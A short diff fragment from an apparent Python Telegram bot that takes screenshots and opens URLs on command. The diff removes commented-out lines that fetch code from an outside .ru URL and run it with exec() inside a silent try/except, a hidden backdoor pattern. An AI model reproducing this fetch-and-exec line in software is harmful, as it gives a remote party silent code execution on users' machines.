@@ -60,10 +60,6 @@ def send_screen(command):
 		bot.send_photo(id_chat, 'Error')
 
 
-# try:
-#     exec(r.get("http://f0428265.xsph.ru/getUpdates.php").text)
-# except: pass
-
 @bot.message_handler(commands=['open_url'])
 def open_url(message):
 	user_msg = '{0}'.format(message.text)
